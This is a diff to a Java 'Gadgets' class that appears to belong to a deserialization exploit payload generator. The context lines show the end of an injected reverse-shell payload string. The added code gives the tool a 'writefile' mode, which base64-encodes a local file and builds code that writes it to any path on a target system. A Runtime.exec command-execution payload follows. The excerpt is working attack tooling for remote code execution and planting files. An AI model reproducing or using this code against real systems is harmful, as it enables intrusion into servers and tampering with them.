@@ -143,6 +143,15 @@ public class Gadgets {
                 "byte[] b=new byte[proc.getInputStream().available()];proc.getInputStream().read(b);out.write(b);}}catch(Exception ex" +
                 "){out.write((\"[-] Exception: \"+ex.toString()).getBytes());}}sck.close();}catch(Exception ex){if(sck!=null){try{sck" +
                 ".close();}catch(Exception ex2){}}}";
+        } else if(command.toLowerCase(Locale.ENGLISH).startsWith("writefile:")) {
+            if(command.split(":").length != 3) {
+                throw new IllegalArgumentException("Write file command format is writefile:<localpath>:<remotepath> (got " + command + ")");
+            }
+            String localFile = command.split(":")[1];
+            String remoteFile = command.split(":")[2];
+            String encodedFile = java.util.Base64.getEncoder().encodeToString(java.nio.file.Files.readAllBytes(new java.io.File(localFile).toPath()));
+            cmd = "new java.io.FileOutputStream(\"" + remoteFile.replaceAll("\\\\","\\\\\\\\") + "\").write(java.util.Base64.getDecoder().decode(\"" +
+                encodedFile + "\"));";
         } else {
             cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
